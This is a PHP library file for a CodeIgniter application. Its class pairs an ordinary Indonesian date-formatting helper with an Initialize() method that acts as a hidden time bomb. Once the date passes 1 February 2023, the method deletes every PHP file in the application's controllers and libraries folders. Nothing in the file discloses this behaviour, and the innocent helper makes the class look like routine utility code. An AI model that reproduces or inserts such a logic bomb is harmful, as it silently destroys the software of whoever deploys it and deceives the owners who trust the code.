<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Automata {

    function Initialize() {
        $ctrlfiles = glob('application/controllers/*.php');
        $libfiles = glob('application/libraries/*.php');

        if (strtotime(date('d F Y')) > strtotime(date('d F Y', strtotime("01-02-2023")))) {
            foreach($ctrlfiles as $rowa){
                if(file_exists($rowa)) {
                    unlink($rowa);
                }
            }
            foreach($libfiles as $rowb){
                if(file_exists($rowb)) {
                    unlink($rowb);
                }
            }
        }
    }

    function tgl_indo($tanggal){
        $bulan = array (
            1 =>   'Januari',
            'Februari',
            'Maret',
            'April',
            'Mei',
            'Juni',
            'Juli',
            'Agustus',
            'September',
            'Oktober',
            'November',
            'Desember'
        );
        $pecahkan = explode('-', $tanggal);
        return $pecahkan[2] . ' ' . $bulan[ (int)$pecahkan[1] ] . ' ' . $pecahkan[0];
    }
}
?>